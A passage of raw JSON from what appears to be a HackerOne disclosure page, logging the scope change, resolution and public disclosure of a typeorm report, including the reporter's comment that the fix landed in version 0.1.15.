\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-12T14:36:29.330Z","updated_at":"2018-08-12T14:37:11.206Z","actor":{"username":"vdeturckheim","cleared":false,"url":"/vdeturckheim","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/161/010/6f383ac0f9296c13b5ac0d38741f0685dbace58c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4255274,"is_internal":false,"editable":false,"type":"Activities::ChangedScope","message":"","markdown_message":"","automated_response":false,"created_at":"2019-03-04T19:31:57.741Z","updated_at":"2019-03-04T19:31:57.741Z","actor":{"username":"ronperris","cleared":false,"url":"/ronperris","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/267/443/1a8173396b482236436c5172363ceb9f64ef27dd_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"old_scope":"Other module","new_scope":"typeorm","genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4255587,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2019-03-04T20:27:24.536Z","updated_at":"2019-03-04T20:27:24.536Z","actor":{"username":"ronperris","cleared":false,"url":"/ronperris","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/267/443/1a8173396b482236436c5172363ceb9f64ef27dd_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"chalker","url":"/chalker"},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4255589,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-03-04T20:27:31.046Z","updated_at":"2019-03-04T20:27:31.046Z","first_to_agree":true,"actor":{"username":"ronperris","cleared":false,"url":"/ronperris","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/267/443/1a8173396b482236436c5172363ceb9f64ef27dd_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4452582,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry, I totally forgot about this issue. This was fixed back in March 2018, in https://github.com/typeorm/typeorm/commit/d46c8b0e6c0db56bb5976a4917e9f67a43715111, and went into  typeorm@0.1.15 release.","markdown_message":"\u003cp\u003eSorry, I totally forgot about this issue. This was fixed back in March 2018, in \u003ca title=\"https://github.com/typeorm/typeorm/commit/d46c8b0e6c0db56bb5976a4917e9f67a43715111\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Ftypeorm%2Ftypeorm%2Fcommit%2Fd46c8b0e6c0db56bb5976a4917e9f67a43715111\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/typeorm/typeorm/commit/d46c8b0e6c0db56bb5976a4917e9f67a43715111\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, and went into  \u003ca title=\"typeorm@0.1.15\" href=\"mailto:typeorm@0.1.15\" rel=\"nofollow noopener noreferrer\"\u003etypeorm@0.1.15\u003c/a\u003e release.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-02T22:52:27.391Z","updated_at":"2019-04-02T22:53:21.363Z","actor":{"username":"chalker","cleared":false,"url":"/chalker","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/068/907/abd483931dad2c93e376707dd59719cc277309cd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4462297,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-03T20:27:32.346Z","updated_at":"2019-04-03T20:27:32.346Z","actor":{"url":"/nodejs-ecosystem","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Node.js third-party modules"}},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}